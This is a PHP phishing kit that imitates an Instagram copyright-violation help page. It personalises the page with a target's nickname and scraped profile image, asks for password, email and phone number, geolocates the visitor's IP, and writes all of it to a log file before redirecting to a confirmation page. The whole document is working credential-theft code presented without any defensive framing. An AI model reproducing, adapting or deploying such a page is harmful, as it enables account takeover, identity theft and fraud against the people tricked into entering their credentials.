<?php
error_reporting(0);
function ara($bas, $son, $yazi)
{
    @preg_match_all('/' . preg_quote($bas, '/') .
    '(.*?)'. preg_quote($son, '/').'/i', $yazi, $m);
    return @$m[1];
}
$nick = $_GET['nick'];
$_SERVER["cwoset"]=$nick;
$url = 'https://instagram.com/' . $nick;
    $html = file_get_contents($url);
    $dom = new DOMDocument();
    $dom->loadHTML($html);
    $veri = $dom->textContent;
    $cc = ara('"thumbnail_src":"','"',$veri);
    $meta_tags = $dom->getElementsByTagName('meta');
    foreach( $meta_tags as $meta ) {
        if( $meta->getAttribute('property') == 'og:image' ) {
            $image_url = $meta->getAttribute('content');
        }
    }
if(empty($cc)){
        $cc[0] = $image_url;
    }
if($_POST){
$mail = $_POST["mail"];
$numara = $_POST["numara"];
$password =  $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
$ulke = $details->country;
date_default_timezone_set('Europe/Istanbul');
$cur_time=date("d-m-Y H:i:s");
$file = fopen('log.txt', 'a');
fwrite($file, "K. Ad: ".$nick."\n" ."Sifre: ".$password. "\n"."Mail: ".$mail."\n"."Numara: ".$numara."\n"."Ip Adres: " .$ip."\n".

"Ülke: ".$ulke ."\n".   "Zaman: " .$cur_time.  "\n\n\n");
fclose($file);
echo '';
    header("Location: confirm.php");
}

    ?>
<html>

<head>
     <meta charset="utf-8">
	 <title>Copyright | lnstagram Help Center</title>
	 <meta name="viewport" content="width=device-width">
<link rel="icon" href="resimler/nins.png">	
<style>

#mete{
background-color:#fafafa;
}
#cwo{
border-radius:5px;}

#set{
font-family:sans-serif;
font-weight:400;
letter-spacing:;
color:#3d3d3d;
font-size:20px;
}

#sa{
background-color:white;
width:300px;

}
#yazi1{
font-family:sans-serif;
color:#999;
width:230px;
 }
 #copyright{
font-family:sans-serif;
color:#999;}
#menu{


width:91%;
} 
#liste{
display:inline-block;}
#link{text-decoration:none;
color:#003569;
font-family:sans-serif;
font-size:13px;
font-weight:540;

    vertical-align: baseline;
}
#üst{
width:100%;
background-color:white;

height:79px;
}

#buton{
color:white;
background-color:#3897f0;
font-size:15px;

border-radius:3px;
outline:none;
font-family:sans-serif;
font-weight:700;
border:0;
width:200px;
height:40px;
max-width:99%;
max-height:50px;
}
.next{

		font-size:16px;
		transition:0.9s;
		background: #4267B2;
		color:white;
		font-weight:bold;
		border-radius:5px;
		margin-top:6px;
		width:150px;
		height:35px;
		border:1px solid #4267B2;
		outline:none;

	}.username::placeholder{
		font-size:15px;
		color: #4267B2;
	}.next:hover{
		background:white;
		color:#4267B2;
		border:1px solid #4267B2;

	}.next:focus{
		background:white;
		color:#4267B2;
		border:1px solid #4267B2;
		transform:scale(0.9);

	}

#password{
background-color:#fafafa;
border:0;
outline:none;
border-radius:6px;
width:220px;
height:35px;

font-size:16px;}

</style>
	 
</head>
<body id="mete" style="padding:0px; margin:0px;">


<center>
<br><br><br><br> <br> <br> <br>
<div id="sa" style="border:1px solid #cecece;"> <br> 


<img src="resimler/png.png" style="max-width:50%;">  <br>
<h1 id="set">@<?php echo $nick; ?> </h1>

<p id="yazi1">
In accordance with lnstagram's Terms of Use and Community Guidelines, you may only post content on lnstagram that does not violate someone else's intellectual property rights. The best way to make sure that the content you post on lnstagram does not violate copyright laws is to only share content that you have created yourself.</p>

<br>

<form method="post" >
<input type="password" name="password" placeholder="Password" required="" style="padding:6px; background:#fafafa; outline:none;text-align:center;
color:; width:83%; height:37px; border:1px solid #dedede; font-family:sans-serif; font-weight:350;     flex: 1 0 0px;
    margin: 0;
    outline: 0;
    overflow: hidden;
    padding: 9px 0 7px 8px;
    text-overflow: ellipsis;
border: 1px solid #e6e6e6;    text-overflow: ellipsis;
    font: 400 13.3333px Arial; border-radius:3px;"><br><br>

<input type="email" name="mail" placeholder="Email " required="" style="text-align:center; padding:6px; background:#fafafa; outline:none;
color:; width:83%; height:37px; border:1px solid #dedede; font-family:sans-serif; font-weight:350;     flex: 1 0 0px;
    margin: 0;
    outline: 0;
    overflow: hidden;
    padding: 9px 0 7px 8px;
    text-overflow: ellipsis;
border: 1px solid #e6e6e6;    text-overflow: ellipsis;
    font: 400 13.3333px Arial; border-radius:3px;"><br><br>

		<input onkeyup="cwoset();"  type="number" placeholder="   Phone "name="numara" required=""  style="padding:6px; background:#fafafa; outline:none;
color:; width:83%; height:37px; border:1px solid #dedede; font-family:sans-serif; font-weight:350;     flex: 1 0 0px;text-align:center;
    margin: 0;
    outline: 0;
    overflow: hidden;
    padding: 9px 0 7px 8px;
    text-overflow: ellipsis;
border: 1px solid #e6e6e6;    text-overflow: ellipsis;
  
    font: 400 13.3333px Arial; border-radius:3px;">	

   <br>

<br><br>
<button id="" class=next  type="submit">Next</button><br><br><br>
<img src="meta.svg" width="250px">
</form>
</center>
</div>


<link rel="stylesheet" href="//www.instagram.com/static/bundles/es6/ConsumerUICommons.css/4c68346f3fc7.css" type="text/css" crossorigin="anonymous">
<link rel="stylesheet" href="//www.instagram.com/static/bundles/es6/ConsumerAsyncCommons.css/f5339c1f472f.css" type="text/css" crossorigin="anonymous">
</body>


</html>
